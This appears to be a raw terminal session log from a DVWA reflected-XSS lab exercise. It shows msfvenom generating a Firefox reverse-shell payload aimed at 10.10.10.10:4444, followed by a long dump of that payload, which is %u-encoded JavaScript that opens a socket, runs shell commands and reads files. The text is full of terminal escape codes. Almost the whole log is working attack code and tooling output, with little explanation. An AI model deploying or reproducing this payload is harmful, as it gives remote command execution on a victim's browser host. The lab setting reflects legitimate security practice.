+"\x74\x68\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x20\x73\x65\x74\x54\x69\x6d\x65\x6f\x75\x74\x28\x66\x75" +
+"\x6e\x63\x74\x69\x6f\x6e\x28\x29\x7b\x63\x62\x28\x66\x61" +
+"\x6c\x73\x65\x2c\x20\x72\x65\x61\x64\x46\x69\x6c\x65\x28" +
+"\x73\x74\x64\x6f\x75\x74\x2e\x70\x61\x74\x68\x29\x29\x3b" +
+"\x7d\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x7d\x0a" +
+"\x20\x20\x20\x20\x20\x20\x7d\x3b\x0a\x20\x20\x20\x20\x0a" +
+"\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x70\x75\x6d\x70\x2e" +
+"\x61\x73\x79\x6e\x63\x52\x65\x61\x64\x28\x6c\x69\x73\x74" +
+"\x65\x6e\x65\x72\x2c\x20\x6e\x75\x6c\x6c\x29\x3b\x0a\x20" +
+"\x20\x20\x20\x20\x20\x7d\x29\x28\x29\x3b\x0a\x0a"
+[4mmsf5[0m payload([1m[31mfirefox/shell_reverse_tcp[0m) [0m> [H[2J[4mmsf5[0m payload([1m[31mfirefox/shell_reverse_tcp[0m) [0m> Interrupt: use the 'exit' command to quit
+[4mmsf5[0m payload([1m[31mfirefox/shell_reverse_tcp[0m) [0m> 
+[1]+  Stopped                 msfconsole -q
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ msfvenom -p payload/firefox/shell_reverse_tcp[1Pfirefox/shell_reverse_tcp[1Pfirefox/shell_reverse_tcp[1Pfirefox/shell_reverse_tcp[1Pfirefox/shell_reverse_tcp[1Pfirefox/shell_reverse_tcp[1Pfirefox/shell_reverse_tcp[1Pfirefox/shell_reverse_tcp[1Pfirefox/shell_reverse_tcp[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C LHOT[KST=10.10.10.10 LPORT=4444  --format js_be -o pay[K[K[Kjs_rsh.js
+[-] No platform was selected, choosing Msf::Module::Platform::Firefox from the payload
+[-] No arch selected, selecting arch: firefox from the payload
+No encoder specified, outputting raw payload
+Error: Big endian format selected for a non big endian payload
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ msfvenom -p firefox/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444  --format js_be -o js_rsh.js[1P[1@l[C[C[C[C[C[C[C[C[C[C[C[C[C[C2.js
+[-] No platform was selected, choosing Msf::Module::Platform::Firefox from the payload
+[-] No arch selected, selecting arch: firefox from the payload
+No encoder specified, outputting raw payload
+Payload size: 7386 bytes
+Final size of js_le file: 22158 bytes
+Saved as: js_rsh2.js
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ ll
+total 296
+-rw-r--r-- 1 dinesh dinesh    184 Aug 31 15:20 01.session
+-rw-r--r-- 1 dinesh dinesh  81920 Aug 31 16:25 01.session.data
+-rw-r--r-- 1 dinesh dinesh     16 Aug 31 16:48 01.session.lck
+-rw-r--r-- 1 dinesh dinesh  99973 Aug 31 16:25 01.session.log
+-rw-r--r-- 1 dinesh dinesh    100 Aug 31 15:20 01.session.properties
+-rw-r--r-- 1 dinesh dinesh   6754 Aug 31 15:20 01.session.script
+drwxr-xr-x 2 dinesh dinesh   4096 Aug 31 15:20 [0m[01;34m01.session.tmp[0m
+-rw-r--r-- 1 dinesh dinesh  22158 Aug 31 16:48 js_rsh2.js
+-rw-r--r-- 1 dinesh dinesh 106496 Aug 31 16:42 terminal_log_Mon_31_Aug_2020_04:25:37_PM_IST.dmp
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ less js_rsh2.js 
+[?1049h[22;0;0t[?1h=%u200a%u2020%u2020%u2820%u7566%u636e%u6974%u6e6f%u2928%u0a7b%u2020%u2020%u2020%u2020%u6977%u646e%u776f%u3d20%u7420%u6968%u3b73%u0a0a%u2 020%u2020%u2020%u2020%u6f43%u706d%u6e6f%u6e65%u7374%u752e%u6974%u736c%u692e%u706d%u726f%u2874%u7222%u7365%u756f%u6372%u3a65%u2f2f%u7267 %u2f65%u6f6d%u7564%u656c%u2f73%u654e%u5574%u6974%u2e6c%u736a%u226d%u3b29%u200a%u2020%u2020%u2020%u7620%u7261%u6820%u736f%u2074%u203d%u3 127%u2e30%u3031%u312e%u2e30%u3031%u3b27%u200a%u2020%u2020%u2020%u7620%u7261%u7020%u726f%u2074%u203d%u3434%u3434%u0a3b%u200a%u2020%u2020 %u2020%u7620%u7261%u7320%u636f%u656b%u5474%u6172%u736e%u6f70%u7472%u3d20%u4320%u6d6f%u6f70%u656e%u746e%u2e73%u6c63%u7361%u6573%u5b73%u4 022%u6f6d%u697a%u6c6c%u2e61%u726f%u2f67%u656e%u7774%u726f%u2f6b%u6f73%u6b63%u7465%u742d%u6172%u736e%u6f70%u7472%u732d%u7265%u6976%u6563 %u313b%u5d22%u200a%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2e20%u6567%u5374%u7265%u6 976%u6563%u4328%u6d6f%u6f70%u656e%u746e%u2e73%u6e69%u6574%u6672%u6361%u7365%u6e2e%u4973%u6f53%u6b63%u7465%u7254%u6e61%u7073%u726f%u5374 %u7265%u6976%u6563%u3b29%u200a%u2020%u2020%u2020%u7620%u7261%u7320%u636f%u656b%u2074%u203d%u6f73%u6b63%u7465%u7254%u6e61%u7073%u726f%u2 e74%u7263%u6165%u6574%u7254%u6e61%u7073%u726f%u2874%u756e%u6c6c%u202c%u2c30%u6820%u736f%u2c74%u7020%u726f%u2c74%u6e20%u6c75%u296c%u0a3b %u2020%u2020%u2020%u2020%u6176%u2072%u756f%u5374%u7274%u6165%u206d%u203d%u6f73%u6b63%u7465%u6f2e%u6570%u4f6e%u7475%u7570%u5374%u7274%u6 165%u286d%u2c30%u3020%u202c%u2930%u0a3b%u2020%u2020%u2020%u2020%u6176%u2072%u6e69%u7453%u6572%u6d61%u3d20%u7320%u636f%u656b%u2e74%u706f %u6e65%u6e49%u7570%u5374%u7274%u6165%u286d%u2c30%u3020%u202c%u2930%u0a3b%u200a%u2020%u2020%u2020%u7620%u7261%u7020%u6d75%u2070%u203d%u6 f43%u706d%u6e6f%u6e65%u7374%u632e%u616c%u7373%u7365%u225b%u6d40%u7a6f%u6c69%u616c%u6f2e%u6772%u6e2f%u7465%u6f77%u6b72%u692f%u706e%u7475 %u732d%u7274%u6165%u2d6d%u7570%u706d%u313b%u5d22%u200a%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u632e%u6572%u7 461%u4965%u736e%u6174%u636e%u2865%u6f43%u706d%u6e6f%u6e65%u7374%u692e%u746e%u7265%u6166%u6563%u2e73%u736e%u4949%u706e%u7475%u7453%u6572 %u6d61%u7550%u706d%u3b29%u200a%u2020%u2020%u2020%u7020%u6d75%u2e70%u6e69%u7469%u6928%u536e%u7274%u6165%u2c6d%u2d20%u2c31%u2d20%u2c31%u3 020%u202c%u2c30%u7420%u7572%u2965%u0a3b%u200a%u2020%u2020%u2020%u0a20%u2020%u2020%u2020%u6176%u2072%u6572%u6461%u6e55%u6974%u546c%u6b6f %u6e65%u3d20%u6620%u6e75%u7463%u6f69%u286e%u6263%u2029%u0a7b%u2020%u2020%u2020%u2020%u6f43%u706d%u6e6f%u6e65%u7374%u752e%u6974%u736c%u6 92e%u706d%u726f%u2874%u7222%u7365%u756f%u6372%u3a65%u2f2f%u7267%u2f65%u6f6d%u7564%u656c%u2f73%u654e%u5574%u6974%u2e6c%u736a%u226d%u3b29 %u0a0a%u2020%u2020%u2020%u2020%u6176%u2072%u7562%u6666%u7265%u3d20%u2720%u2c27%u6d20%u3d20%u6e20%u6c75%u3b6c%u200a%u2020%u2020%u2020%u7 220%u7465%u7275%u206e%u7566%u636e%u6974%u6e6f%u7228%u7165%u6575%u7473%u202c%u6f63%u746e%u7865%u2c74%u7320%u7274%u6165%u2c6d%u6f20%u6666 %u6573%u2c74%u6320%u756f%u746e%u2029%u0a7b%u2020%u2020%u2020%u2020%u2020%u7562%u6666%u7265%u2b20%u203d%u654e%u5574%u6974%u2e6c%u6572%u6 461%u6e49%u7570%u5374%u7274%u6165%u546d%u536f%u7274%u6e69%u2867%u7473%u6572%u6d61%u202c%u6f63%u6e75%u2974%u0a3b%u2020%u2020%u2020%u2020 %u2020%u6669%u2820%u7562%u6666%u7265%u6d2e%u7461%u6863%u2f28%u285e%u5b5c%u5b5c%u775c%u387b%u5c7d%u5c5d%u295d%u292f%u2029%u0a7b%u2020%u2 020%u2020%u2020%u2020%u2020%u6669%u2820%u206d%u203d%u7562%u6666%u7265%u6d2e%u7461%u6863%u2f28%u285e%u5b5c%u5b5c%u775c%u387b%u5c7d%u5c5d %u295d%u5b28%u735c%u535c%u2a5d%u5c29%u2f31%u2929%u7b20%u200a%u2020%u2020%u2020%u2020%u2020%u2020%u6320%u2862%u5b6d%u5d32%u3b29%u200a%u2 020%u2020%u2020%u2020%u2020%u2020%u6220%u6675%u6566%u2072%u203d%u2727%u0a3b%u2020%u2020%u2020%u2020%u2020%u2020%u0a7d%u2020%u2020%u2020 %u2020%u2020%u207d%u6c65%u6573%u6920%u2066%u6228%u6675%u6566%u2e72%u6e69%u6564%u4f78%u2866%u5c22%u226e%u2029%u203e%u312d%u2029%u0a7b%u2 020%u2020%u2020%u2020%u2020%u2020%u6263%u6228%u6675%u6566%u2972%u0a3b%u2020%u2020%u2020%u2020%u2020%u2020%u7562%u6666%u7265%u3d20%u2720 %u3b27%u200a%u2020%u2020%u2020%u2020%u7d20%u200a%u2020%u2020%u2020%u7d20%u0a3b%u2020%u2020%u2020%u3b7d%u200a%u2020%u0a20%u200a%u2020%u2 020%u2020%u7620%u7261%u6c20%u7369%u6574%u656e%u2072%u203d%u0a7b%u2020%u2020%u2020%u2020%u2020%u6e6f%u7453%u7261%u5274%u7165%u6575%u7473 %u203a%u7566%u636e%u6974%u6e6f%u7228%u7165%u6575%u7473%u202c%u6f63%u746e%u7865%u2974%u7b20%u2c7d%u200a%u2020%u2020%u2020%u2020%u6f20%u5 [7mjs_rsh2.js[27m[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KBB[K36e%u6f74%u5270%u7165%u6575%u7473%u203a%u7566%u636e%u6974%u6e6f%u7228%u7165%u6575%u7473%u202c%u6f63%u746e%u7865%u2974%u7b20%u2c7d%u200a :[K[K [KESCESC[KOO[KBB[K%u2020%u2020%u2020%u2020%u6f20%u446e%u7461%u4161%u6176%u6c69%u6261%u656c%u203a%u6572%u6461%u6e55%u6974%u546c%u6b6f%u6e65%u6628%u6e75%u7 :[K[K [KESCESC[KOO[KBB[K463%u6f69%u286e%u6164%u6174%u2029%u0a7b%u2020%u2020%u2020%u2020%u2020%u2020%u7572%u436e%u646d%u6428%u7461%u2c61%u6620%u6e75%u7463%u6f69 :[K[K [KESCESC[KOO[KBB[K%u286e%u7265%u2c72%u6f20%u7475%u7570%u2974%u7b20%u200a%u2020%u2020%u2020%u2020%u2020%u2020%u6920%u2066%u2128%u7265%u2972%u6f20%u7475%u7 :[K[K [KESCESC[KOO[KBB[K453%u6572%u6d61%u772e%u6972%u6574%u6f28%u7475%u7570%u2c74%u6f20%u7475%u7570%u2e74%u656c%u676e%u6874%u3b29%u200a%u2020%u2020%u2020%u2020 :[K[K [KESCESC[KOO[KBB[K%u2020%u7d20%u3b29%u200a%u2020%u2020%u2020%u2020%u7d20%u0a29%u2020%u2020%u2020%u2020%u3b7d%u0a0a%u2020%u2020%u2020%u2020%u200a%u2020%u2 :[K[K [KESCESC[KOO[KBB[K020%u0a20%u2020%u2020%u2020%u6176%u2072%u6572%u6461%u6946%u656c%u3d20%u6620%u6e75%u7463%u6f69%u286e%u6170%u6874%u2029%u0a7b%u2020%u2020 :[K[K [KESCESC[KOO[KBB[K%u2020%u2020%u7274%u2079%u0a7b%u2020%u2020%u2020%u2020%u2020%u6176%u2072%u6966%u656c%u3d20%u4320%u6d6f%u6f70%u656e%u746e%u2e73%u6c63%u7 :[K[K [KESCESC[KOO[KBB[K361%u6573%u5b73%u4022%u6f6d%u697a%u6c6c%u2e61%u726f%u2f67%u6966%u656c%u6c2f%u636f%u6c61%u313b%u5d22%u200a%u2020%u2020%u2020%u2020%u2020 :[K[K [KESCESC[KOO[KBB[K%u2020%u2020%u2020%u2020%u632e%u6572%u7461%u4965%u736e%u6174%u636e%u2865%u6f43%u706d%u6e6f%u6e65%u7374%u692e%u746e%u7265%u6166%u6563%u2 :[K[K [KESCESC[KOO[KBB[Ke73%u736e%u4c49%u636f%u6c61%u6946%u656c%u3b29%u200a%u2020%u2020%u2020%u2020%u6620%u6c69%u2e65%u6e69%u7469%u6957%u6874%u6150%u6874%u7028 :[K[K [KESCESC[KOO[KBB[K%u7461%u2968%u0a3b%u200a%u2020%u2020%u2020%u2020%u7620%u7261%u6620%u6c69%u5365%u7274%u6165%u206d%u203d%u6f43%u706d%u6e6f%u6e65%u7374%u6 :[K[K [KESCESC[KOO[KBB[K32e%u616c%u7373%u7365%u225b%u6d40%u7a6f%u6c69%u616c%u6f2e%u6772%u6e2f%u7465%u6f77%u6b72%u662f%u6c69%u2d65%u6e69%u7570%u2d74%u7473%u6572 :[K[K [KESCESC[KOO[KBB[K%u6d61%u313b%u5d22%u200a%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u632e%u6572%u7461%u4965%u736e%u6 :[K[K [KESCESC[KOO[KBB[K174%u636e%u2865%u6f43%u706d%u6e6f%u6e65%u7374%u692e%u746e%u7265%u6166%u6563%u2e73%u736e%u4649%u6c69%u4965%u706e%u7475%u7453%u6572%u6d61 :[K[K [KESCESC[KOO[KBB[K%u3b29%u200a%u2020%u2020%u2020%u2020%u6620%u6c69%u5365%u7274%u6165%u2e6d%u6e69%u7469%u6628%u6c69%u2c65%u3120%u202c%u2c30%u6620%u6c61%u6 :[K[K [KESCESC[KOO[KBB[K573%u3b29%u0a0a%u2020%u2020%u2020%u2020%u2020%u6176%u2072%u6962%u616e%u7972%u7453%u6572%u6d61%u3d20%u4320%u6d6f%u6f70%u656e%u746e%u2e73 :[K[K [KESCESC[KOO[KBB[K%u6c63%u7361%u6573%u5b73%u4022%u6f6d%u697a%u6c6c%u2e61%u726f%u2f67%u6962%u616e%u7972%u6e69%u7570%u7374%u7274%u6165%u3b6d%u2231%u0a5d%u2 :[K[K [KESCESC[KOO[KBB[K020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2e20%u7263%u6165%u6574%u6e49%u7473%u6e61%u6563%u4328 :[K[K [KESCESC[KOO[KBB[K%u6d6f%u6f70%u656e%u746e%u2e73%u6e69%u6574%u6672%u6361%u7365%u6e2e%u4973%u6942%u616e%u7972%u6e49%u7570%u5374%u7274%u6165%u296d%u0a3b%u2 :[K[K [KESCESC[KOO[KBB[K020%u2020%u2020%u2020%u2020%u6962%u616e%u7972%u7453%u6572%u6d61%u732e%u7465%u6e49%u7570%u5374%u7274%u6165%u286d%u6966%u656c%u7453%u6572 :[K[K [KESCESC[KOO[KBB[K%u6d61%u3b29%u200a%u2020%u2020%u2020%u2020%u7620%u7261%u6120%u7272%u7961%u3d20%u6220%u6e69%u7261%u5379%u7274%u6165%u2e6d%u6572%u6461%u7 :[K[K [KESCESC[KOO[KBB[K942%u6574%u7241%u6172%u2879%u6966%u656c%u7453%u6572%u6d61%u612e%u6176%u6c69%u6261%u656c%u2928%u3b29%u0a0a%u2020%u2020%u2020%u2020%u2020 :[K[K [KESCESC[KOO[KBB[K%u6962%u616e%u7972%u7453%u6572%u6d61%u632e%u6f6c%u6573%u2928%u0a3b%u2020%u2020%u2020%u2020%u2020%u6966%u656c%u7453%u6572%u6d61%u632e%u6 :[K[K [KESCESC[KOO[KBB[Kf6c%u6573%u2928%u0a3b%u2020%u2020%u2020%u2020%u2020%u6966%u656c%u722e%u6d65%u766f%u2865%u7274%u6575%u3b29%u0a0a%u2020%u2020%u2020%u2020 :[K[K [KESCESC[KOO[KBB[K%u2020%u6572%u7574%u6e72%u6120%u7272%u7961%u6d2e%u7061%u6628%u6e75%u7463%u6f69%u286e%u4961%u6574%u296d%u7b20%u7220%u7465%u7275%u206e%u7 :[K[K [KESCESC[KOO[KBB[K453%u6972%u676e%u662e%u6f72%u436d%u6168%u4372%u646f%u2865%u4961%u6574%u296d%u203b%u297d%u6a2e%u696f%u286e%u2222%u3b29%u200a%u2020%u2020 :[K[K [KESCESC[KOO[KBB[K%u2020%u7d20%u6320%u7461%u6863%u2820%u2965%u7b20%u7220%u7465%u7275%u206e%u2222%u203b%u0a7d%u2020%u2020%u2020%u3b7d%u200a%u2020%u0a20%u2 :[K[K [KESCESC[KOO[KBB[K020%u2020%u2020%u200a%u2020%u2020%u7620%u7261%u7320%u7465%u6954%u656d%u756f%u2074%u203d%u7566%u636e%u6974%u6e6f%u6328%u2c62%u6420%u6c65 :[K[K [KESCESC[KOO[KBB[K%u7961%u2029%u0a7b%u2020%u2020%u2020%u2020%u6176%u2072%u6974%u656d%u2072%u203d%u6f43%u706d%u6e6f%u6e65%u7374%u632e%u616c%u7373%u7365%u2 :[K[K [KESCESC[KOO[KBB[K25b%u6d40%u7a6f%u6c69%u616c%u6f2e%u6772%u742f%u6d69%u7265%u313b%u5d22%u632e%u6572%u7461%u4965%u736e%u6174%u636e%u2865%u6f43%u706d%u6e6f :[K[K [KESCESC[KOO[KBB[K%u6e65%u7374%u692e%u746e%u7265%u6166%u6563%u2e73%u736e%u5449%u6d69%u7265%u3b29%u200a%u2020%u2020%u2020%u7420%u6d69%u7265%u692e%u696e%u5 :[K[K [KESCESC[KOO[KBB[K774%u7469%u4368%u6c61%u626c%u6361%u286b%u6e7b%u746f%u6669%u3a79%u6263%u2c7d%u6420%u6c65%u7961%u202c%u6f43%u706d%u6e6f%u6e65%u7374%u692e :[K[K [KESCESC[KOO[KBB[K%u746e%u7265%u6166%u6563%u2e73%u736e%u5449%u6d69%u7265%u542e%u5059%u5f45%u4e4f%u5f45%u4853%u544f%u3b29%u200a%u2020%u2020%u2020%u7220%u7 :[K[K [KESCESC[KOO[KBB[K465%u7275%u206e%u6974%u656d%u3b72%u200a%u2020%u2020%u7d20%u0a3b%u2020%u2020%u0a0a%u2020%u2020%u2020%u6176%u2072%u6175%u3d20%u4320%u6d6f :[K[K [KESCESC[KOO[KBB[K%u6f70%u656e%u746e%u2e73%u6c63%u7361%u6573%u5b73%u4022%u6f6d%u697a%u6c6c%u2e61%u726f%u2f67%u656e%u7774%u726f%u2f6b%u7270%u746f%u636f%u6 :[K[K [KESCESC[KOO[KBB[Kc6f%u313b%u6e3f%u6d61%u3d65%u7468%u7074%u5d22%u200a%u2020%u2020%u2020%u2e20%u6567%u5374%u7265%u6976%u6563%u4328%u6d6f%u6f70%u656e%u746e :[K[K [KESCESC[KOO[KBB[K%u2e73%u6e69%u6574%u6672%u6361%u7365%u6e2e%u4973%u7448%u7074%u7250%u746f%u636f%u6c6f%u6148%u646e%u656c%u2972%u752e%u6573%u4172%u6567%u7 :[K[K [KESCESC[KOO[KBB[K46e%u0a3b%u2020%u2020%u2020%u6176%u2072%u6977%u646e%u776f%u2073%u203d%u7528%u2e61%u6e69%u6564%u4f78%u2866%u5722%u6e69%u6f64%u7377%u2922 :[K[K [KESCESC[KOO[KBB[K%u2d3e%u2931%u0a3b%u2020%u2020%u2020%u6176%u2072%u7673%u7363%u3d20%u4320%u6d6f%u6f70%u656e%u746e%u2e73%u7475%u6c69%u2e73%u6d69%u6f70%u7 :[K[K [KESCESC[KOO[KBB[K472%u2228%u6572%u6f73%u7275%u6563%u2f3a%u672f%u6572%u6d2f%u646f%u6c75%u7365%u532f%u7265%u6976%u6563%u2e73%u736a%u226d%u3b29%u200a%u2020 :[K[K [KESCESC[KOO[KBB[K%u2020%u7620%u7261%u6a20%u6373%u6972%u7470%u3d20%u2820%u227b%u7273%u2263%u223a%u6e5c%u2020%u2020%u2020%u6176%u2072%u3662%u2034%u203d%u5 :[K[K [KESCESC[KOO[KBB[K357%u7263%u7069%u2e74%u7261%u7567%u656d%u746e%u2873%u2930%u5c3b%u206e%u2020%u2020%u7620%u7261%u6420%u6d6f%u3d20%u6e20%u7765%u4120%u7463 :[K[K [KESCESC[KOO[KBB[K%u7669%u5865%u624f%u656a%u7463%u5c28%u4d22%u5853%u4c4d%u2e32%u4f44%u444d%u636f%u6d75%u6e65%u2e74%u2e33%u5c30%u2922%u5c3b%u206e%u2020%u2 :[K[K [KESCESC[KOO[KBB[K020%u7620%u7261%u6520%u206c%u3d20%u6420%u6d6f%u632e%u6572%u7461%u4565%u656c%u656d%u746e%u5c28%u7222%u6f6f%u5c74%u2922%u5c3b%u206e%u2020 :[K[K [KESCESC[KOO[KBB[K%u2020%u6520%u2e6c%u6164%u6174%u7954%u6570%u3d20%u5c20%u6222%u6e69%u622e%u7361%u3665%u5c34%u3b22%u6520%u2e6c%u6574%u7478%u3d20%u6220%u3 :[K[K [KESCESC[KOO[KBB[K436%u203b%u6f64%u2e6d%u7061%u6570%u646e%u6843%u6c69%u2864%u6c65%u3b29%u6e5c%u2020%u2020%u2020%u6176%u2072%u7473%u6572%u6d61%u3d20%u6e20 :[K[K [KESCESC[KOO[KBB[K%u7765%u4120%u7463%u7669%u5865%u624f%u656a%u7463%u5c28%u4122%u4f44%u4244%u532e%u7274%u6165%u5c6d%u2922%u5c3b%u206e%u2020%u2020%u7320%u7 :[K[K [KESCESC[KOO[KBB[K274%u6165%u2e6d%u7954%u6570%u313d%u203b%u7473%u6572%u6d61%u4f2e%u6570%u286e%u3b29%u7320%u7274%u6165%u2e6d%u7257%u7469%u2865%u6c65%u6e2e :[K[K [KESCESC[K[[[K66[K~~[K%u646f%u5465%u7079%u6465%u6156%u756c%u2965%u5c3b%u206e%u2020%u2020%u7320%u7274%u6165%u2e6d%u6f50%u6973%u6974%u6e6f%u303d%u203b%u7473%u6 572%u6d61%u742e%u7079%u3d65%u3b32%u7320%u7274%u6165%u2e6d%u6843%u7261%u6553%u2074%u203d%u225c%u7375%u612d%u6373%u6969%u225c%u203b%u7473 %u6572%u6d61%u502e%u736f%u7469%u6f69%u3d6e%u3b30%u6e5c%u2020%u2020%u2020%u6176%u2072%u6d63%u2064%u203d%u7473%u6572%u6d61%u522e%u6165%u5 464%u7865%u2874%u3b29%u6e5c%u2020%u2020%u2020%u6e28%u7765%u4120%u7463%u7669%u5865%u624f%u656a%u7463%u5c28%u5722%u6353%u6972%u7470%u532e %u6568%u6c6c%u225c%u2929%u522e%u6e75%u6328%u646d%u202c%u2c30%u7420%u7572%u2965%u5c3b%u206e%u2020%u2220%u297d%u732e%u6372%u0a3b%u2020%u2 020%u2020%u6176%u2072%u7572%u436e%u646d%u3d20%u6620%u6e75%u7463%u6f69%u286e%u6d63%u2c64%u6320%u2962%u7b20%u200a%u2020%u2020%u2020%u6320 %u2062%u203d%u6263%u7c20%u207c%u6628%u6e75%u7463%u6f69%u286e%u7b29%u297d%u0a3b%u200a%u2020%u2020%u2020%u6920%u2066%u6328%u646d%u742e%u6 972%u286d%u2e29%u656c%u676e%u6874%u3d20%u203d%u2930%u7b20%u200a%u2020%u2020%u2020%u2020%u7320%u7465%u6954%u656d%u756f%u2874%u7566%u636e %u6974%u6e6f%u2928%u207b%u6263%u2228%u6f43%u6d6d%u6e61%u2064%u7369%u6520%u706d%u7974%u7320%u7274%u6e69%u2067%u2728%u2927%u222e%u3b29%u7 d20%u3b29%u200a%u2020%u2020%u2020%u2020%u7220%u7465%u7275%u3b6e%u200a%u2020%u2020%u2020%u7d20%u0a0a%u2020%u2020%u2020%u2020%u6176%u2072 %u736a%u3d20%u2820%u5e2f%u735c%u5c2a%u4a5b%u5641%u5341%u5243%u5049%u5c54%u285d%u5c5b%u5c73%u5d53%u292a%u5b5c%u2f5c%u414a%u4156%u4353%u4 952%u5450%u5d5c%u672f%u2e29%u7865%u6365%u6328%u646d%u742e%u6972%u286d%u2929%u0a3b%u2020%u2020%u2020%u2020%u6669%u2820%u736a%u2029%u0a7b %u2020%u2020%u2020%u2020%u2020%u6176%u2072%u6174%u2067%u203d%u5b22%u4a21%u5641%u5341%u5243%u5049%u5d54%u3b22%u200a%u2020%u2020%u2020%u2 020%u7620%u7261%u7320%u6e79%u2063%u203d%u7274%u6575%u203b%u2f20%u202a%u7661%u696f%u2064%u617a%u676c%u276f%u2073%u6572%u6361%u2068%u2f2a %u200a%u2020%u2020%u2020%u2020%u7620%u7261%u7320%u6e65%u2074%u203d%u6166%u736c%u3b65%u200a%u2020%u2020%u2020%u2020%u7620%u7261%u7220%u7 465%u6156%u206c%u203d%u756e%u6c6c%u0a3b%u200a%u2020%u2020%u2020%u2020%u7420%u7972%u7b20%u200a%u2020%u2020%u2020%u2020%u2020%u7420%u6968 %u2e73%u6573%u646e%u3d20%u6620%u6e75%u7463%u6f69%u286e%u2972%u0a7b%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u6669%u2820%u6573%u746e%u2 029%u6572%u7574%u6e72%u0a3b%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u6573%u746e%u3d20%u7420%u7572%u3b65%u200a%u2020%u2020%u2020%u2020 %u2020%u2020%u6920%u2066%u7228%u2029%u0a7b%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u6669%u2820%u7973%u636e%u2029%u6573%u5474%u6 d69%u6f65%u7475%u6628%u6e75%u7463%u6f69%u286e%u7b29%u6320%u2862%u6166%u736c%u2c65%u7220%u742b%u6761%u222b%u6e5c%u2922%u203b%u297d%u0a3b %u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u6c65%u6573%u2020%u2020%u2020%u6263%u6628%u6c61%u6573%u202c%u2b72%u6174%u2b67%u5c22%u2 26e%u3b29%u200a%u2020%u2020%u2020%u2020%u2020%u2020%u7d20%u200a%u2020%u2020%u2020%u2020%u2020%u7d20%u0a3b%u2020%u2020%u2020%u2020%u2020 %u2020%u6572%u5674%u6c61%u3d20%u4620%u6e75%u7463%u6f69%u286e%u736a%u315b%u295d%u632e%u6c61%u286c%u6874%u7369%u3b29%u200a%u2020%u2020%u2 020%u2020%u7d20%u6320%u7461%u6863%u2820%u2965%u7b20%u7220%u7465%u6156%u206c%u203d%u2e65%u656d%u7373%u6761%u3b65%u7d20%u0a0a%u2020%u2020 %u2020%u2020%u2020%u7973%u636e%u3d20%u6620%u6c61%u6573%u0a3b%u200a%u2020%u2020%u2020%u2020%u6920%u2066%u7228%u7465%u6156%u206c%u2626%u2 120%u6573%u746e%u2029%u0a7b%u2020%u2020%u2020%u2020%u2020%u2020%u6573%u746e%u3d20%u7420%u7572%u3b65%u200a%u2020%u2020%u2020%u2020%u2020 %u7320%u7465%u6954%u656d%u756f%u2874%u7566%u636e%u6974%u6e6f%u2928%u207b%u6263%u6628%u6c61%u6573%u202c%u6572%u5674%u6c61%u742b%u6761%u2 22b%u6e5c%u2922%u203b%u297d%u0a3b%u2020%u2020%u2020%u2020%u2020%u0a7d%u200a%u2020%u2020%u2020%u2020%u7220%u7465%u7275%u3b6e%u200a%u2020 %u2020%u2020%u7d20%u0a0a%u2020%u2020%u2020%u2020%u6176%u2072%u6873%u7345%u2063%u203d%u5c22%u245c%u2226%u0a3b%u2020%u2020%u2020%u2020%u6 176%u2072%u6873%u6150%u6874%u3d20%u2220%u622f%u6e69%u732f%u2068%u632d%u3b22%u0a0a%u2020%u2020%u2020%u2020%u6669%u2820%u6977%u646e%u776f %u2973%u7b20%u200a%u2020%u2020%u2020%u2020%u7320%u5068%u7461%u2068%u203d%u6322%u646d%u2f20%u2263%u0a3b%u2020%u2020%u2020%u2020%u2020%u6 873%u7345%u2063%u203d%u5c22%u245e%u2226%u0a3b%u2020%u2020%u2020%u2020%u2020%u6176%u2072%u736a%u7263%u7069%u4674%u6c69%u2065%u203d%u6f43 %u706d%u6e6f%u6e65%u7374%u632e%u616c%u7373%u7365%u225b%u6d40%u7a6f%u6c69%u616c%u6f2e%u6772%u662f%u6c69%u2f65%u6964%u6572%u7463%u726f%u5 :[K[K [KESCESC[K[[[K66[K~~[Kf79%u6573%u7672%u6369%u3b65%u2231%u0a5d%u2020%u2020%u2020%u2020%u2020%u2020%u672e%u7465%u6553%u7672%u6369%u2865%u6f43%u706d%u6e6f%u6e65 %u7374%u692e%u746e%u7265%u6166%u6563%u2e73%u736e%u5049%u6f72%u6570%u7472%u6569%u2973%u200a%u2020%u2020%u2020%u2020%u2020%u2e20%u6567%u2 